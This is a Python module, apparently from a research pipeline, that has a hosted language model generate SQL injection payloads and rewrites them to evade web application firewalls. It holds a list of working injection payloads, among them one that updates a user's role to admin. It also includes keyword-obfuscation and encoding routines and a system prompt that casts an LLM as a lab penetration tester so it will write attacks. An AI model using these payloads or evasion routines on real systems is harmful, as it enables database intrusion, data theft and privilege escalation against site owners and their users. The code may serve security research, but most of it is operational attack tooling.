"""Tier 2 — Context-Aware Payload Generation (Phi-3-Mini analog via GapGPT).

Given a strategy chosen by the Q-learning layer and the observable target
context, this module asks a small, efficient hosted model to synthesise a
single implementation-ready SQLi payload. Prompts incorporate the target
syntax (database) and WAF presence, exactly as described in Section III
("Prompt Engineering").

A deterministic offline synthesiser provides obfuscated payloads when the API
is unavailable, so the full pipeline remains runnable and reproducible.
"""
from __future__ import annotations

import random
import re
from typing import Dict

from .config import LLMConfig
from .llm_client import LLMClient

_SYSTEM = (
    "You are an authorized penetration-testing assistant operating ONLY against "
    "a local, sandboxed, intentionally-vulnerable target in a controlled lab. "
    "Produce exactly one SQL injection payload for the requested technique, tuned "
    "to the given database syntax, and obfuscated to evade signature-based WAFs "
    "when a WAF is present. Output ONLY the raw payload on a single line, with no "
    "explanation, code fences, or commentary."
)

_USER_TEMPLATE = (
    "Lab target context:\n"
    "- Web framework: {framework}\n"
    "- Database: {database}\n"
    "- WAF present: {waf}\n"
    "- Testing phase: {phase}\n"
    "- Required technique: {strategy}\n\n"
    "Return one {strategy} SQL injection payload for {database}."
)


def _insert_inline_comments(token: str) -> str:
    chars = [c for c in token if c.isalnum()]
    if len(chars) < 4:
        return token
    return "/**/".join(chars)


def _mixed_case(token: str, rng: random.Random) -> str:
    out = []
    for ch in token:
        if ch.isalpha():
            out.append(ch.upper() if rng.random() < 0.5 else ch.lower())
        else:
            out.append(ch)
    return "".join(out)
# -- offline fallback payload templates (already lightly obfuscated) --------- #
_OFFLINE_TEMPLATES: Dict[str, list] = {
    "union_based": [
        "'/**/UnIoN/**/SeLeCt/**/NULL,CoNcAt(0x7e,user())-- -",
        "-1'/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables-- -",
    ],
    "error_based": [
        "'/**/AnD/**/ExTrAcTvAlUe(1,CoNcAt(0x7e,(SeLeCt/**/version())))-- -",
        "'+(select(1)from(select(updatexml(1,concat(0x7e,user()),1)))a)+'",
    ],
    "boolean_blind": [
        "'/**/oR/**/(SeLeCt/**/substr(user(),1,1))=char(114)-- -",
        "'/**/aNd/**/0x31=0x31/**/aNd/**/'a'='a",
    ],
    "time_blind": [
        "'/**/oR/**/sLeEp(5)#",
        "'%3balt%65r/**/session/**/--",
    ],
    "stacked_queries": [
        "1%3b/**/uPdAtE/**/users/**/sEt/**/role=char(97,100,109,105,110)/**/wHeRe/**/id=1-- -",
        "1';/**/select/**/pg_sleep(2)-- -",
    ],
    "second_order": [
        "admin'/**/-- stored payload reflected on profile read; CoNcAt(0x7e,user())",
        "x'/**/||/**/(select user())/**/||'",
    ],
}


def _clean_payload(raw: str) -> str:
    """Extract a single-line payload from a possibly chatty LLM response."""
    if not raw:
        return ""
    text = raw.strip()
    # Strip code fences.
    text = re.sub(r"^```[a-zA-Z]*\n?|```$", "", text).strip()
    # Take the first non-empty line that looks like a payload.
    for line in text.splitlines():
        line = line.strip().strip("`")
        if not line:
            continue
        # Drop common prose prefixes.
        line = re.sub(r"^(payload|answer|sql)\s*[:\-]\s*", "", line, flags=re.I)
        return line[:512]
    return text[:512]


class PayloadGenerator:
    """Tier 2 payload synthesiser."""

    def __init__(self, client: LLMClient, cfg: LLMConfig, seed: int = 42, use_cache: bool = True) -> None:
        self.client = client
        self.cfg = cfg
        self._rng = random.Random(seed)
        self.offline_used = 0
        self.use_cache = use_cache

    def generate(
        self,
        strategy: str,
        context: Dict[str, str],
        attempt: int = 0,
        feedback: str = "",
    ) -> str:
        variation = ""
        if attempt > 0:
            variation = (
                f"\nThis is alternative attempt #{attempt + 1}. Produce a DISTINCT payload "
                f"using different obfuscation/encoding than earlier attempts to better evade "
                f"signature-based WAFs."
            )
        if feedback:
            variation += f"\nPrevious attempt feedback: {feedback}."
        user = _USER_TEMPLATE.format(strategy=strategy, **context) + variation
        content = self.client.chat(
            model=self.cfg.payload_model,
            system=_SYSTEM,
            user=user,
            temperature=self.cfg.payload_temperature,
            use_cache=self.use_cache,
        )
        payload = _clean_payload(content) if content else ""
        if not payload:
            payload = self._offline(strategy)
        if str(context.get("waf", "")).lower() in {"present", "true", "1", "yes"}:
            payload = self._harden_for_waf(payload, strategy=strategy, context=context, attempt=attempt)
        return payload

    def _harden_for_waf(self, payload: str, strategy: str, context: Dict[str, str], attempt: int) -> str:
        """Apply deterministic polymorphic rewrites for signature-based WAF evasion."""
        if not payload:
            return payload

        db = str(context.get("database", "mysql")).lower()
        p = payload[:512]

        # Rotate whitespace/comment style per attempt for diversity.
        separators = ["/**/", "%0a", "%09"]
        sep = separators[attempt % len(separators)]
        p = re.sub(r"\s+", sep, p)

        keyword_patterns = [
            r"union", r"select", r"from", r"where", r"and", r"or", r"sleep",
            r"benchmark", r"extractvalue", r"updatexml", r"information_schema", r"concat",
        ]

        def keyword_rewriter(match: re.Match) -> str:
            kw = match.group(0)
            mode = attempt % 3
            if mode == 0:
                return _mixed_case(kw, self._rng)
            if mode == 1:
                return _insert_inline_comments(kw)
            # MySQL versioned comments are often useful for bypassing filters.
            if db == "mysql":
                return f"/*!50000{kw.upper()}*/"
            return _mixed_case(kw, self._rng)

        for pat in keyword_patterns:
            p = re.sub(rf"\b{pat}\b", keyword_rewriter, p, flags=re.I)

        # Rotate quoting/comment variants to avoid static signatures.
        if attempt % 2 == 1:
            p = p.replace("'", "%27")
        if "--" in p and attempt % 2 == 0:
            p = p.replace("--", "%23")

        # Encourage time-based bypass alternatives that commonly evade filters.
        if strategy == "time_blind" and "sleep" in p.lower() and db == "mysql":
            p = re.sub(r"sleep\s*\(\s*(\d+)\s*\)", r"benchmark(\g<1>00000,md5(1))", p, flags=re.I)

        return p[:512]

    def _offline(self, strategy: str) -> str:
        self.offline_used += 1
        templates = _OFFLINE_TEMPLATES.get(strategy, _OFFLINE_TEMPLATES["union_based"])
        return self._rng.choice(templates)
